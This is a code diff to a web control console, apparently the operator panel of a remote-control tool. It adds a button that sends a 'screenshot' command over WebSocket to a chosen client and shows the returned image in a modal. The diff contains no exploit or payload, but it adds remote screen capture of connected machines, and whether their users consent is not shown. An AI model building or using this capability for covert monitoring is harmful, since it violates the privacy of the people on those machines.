@@ -490,6 +490,12 @@
                                 <div class="clear"></div>
                             </div>
 
+                            <label class="form-label" style="margin-top: 10px;">屏幕截图 (Screen Capture)</label>
+                            <div class="button-grid">
+                                <button class="btn" style="background:#0d7377;background-image:-webkit-linear-gradient(top,#14919b 0%,#0a5d61 100%);background-image:linear-gradient(to bottom,#14919b 0%,#0a5d61 100%);border-color:#074e52;color:#fff;text-shadow:0 -1px 0 rgba(0,0,0,0.35);width:100%;border-left-width:1px;border-right-width:1px;border-radius:10px;" onclick="sendScreenshot()">📸 查看屏幕</button>
+                                <div class="clear"></div>
+                            </div>
+
                             <label class="form-label" style="margin-top: 10px;">安全控制 (Safety Controls)</label>
                             <div class="button-grid">
                                 <button class="btn btn-danger" style="width: 100%; border-left-width: 1px; border-right-width: 1px; border-radius: 10px;" onclick="sendCommand('exit')">一键清除恢复 (Exit)</button>
@@ -504,6 +510,16 @@
     </div>
 
     <div class="msg" id="msg"></div>
+
+    <div id="screenshotModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:9999; justify-content:center; align-items:center;">
+        <div style="background:#1a1a2e; padding:20px; border-radius:8px; max-width:90vw; max-height:90vh;">
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
+                <span id="screenshotTitle" style="color:#e0e0e0; font-size:14px;">屏幕截图</span>
+                <button onclick="document.getElementById('screenshotModal').style.display='none'" style="background:#e74c3c; color:white; border:none; padding:4px 12px; border-radius:4px; cursor:pointer;">关闭</button>
+            </div>
+            <img id="screenshotImage" src="" style="max-width:85vw; max-height:80vh; border-radius:4px;" />
+        </div>
+    </div>
 
     <script>
         var ws = null;
@@ -640,6 +656,18 @@
                         $("loginBtn").disabled = false;
                         $("loginBtn").innerHTML = "Enter console";
                         ws.close();
+                    } else if (data.type === "screenshot") {
+                        var modal = document.getElementById('screenshotModal');
+                        var img = document.getElementById('screenshotImage');
+                        var title = document.getElementById('screenshotTitle');
+                        title.textContent = '屏幕截图 - ' + (data.from || 'Unknown');
+                        if (data.data) {
+                            img.src = 'data:image/jpeg;base64,' + data.data;
+                            modal.style.display = 'flex';
+                        } else {
+                            img.src = '';
+                            alert('截图失败：客户端可能未安装 mss 库');
+                        }
                     }
                 };
                 ws.onclose = function() {
@@ -800,6 +828,13 @@
             };
             ws.send(JSON.stringify({type: "control", command: cmd, target_client: target || null, config: null}));
             showMsg("Sent: " + (names[cmd] || cmd));
+        }
+
+        function sendScreenshot() {
+            var target = $("targetSelect").value;
+            if (!target) { alert('请先选择一个客户端'); return; }
+            ws.send(JSON.stringify({type: "control", command: "screenshot", target: target}));
+            showMsg('📸 等待截图...');
         }
 
         function sendConfig() {
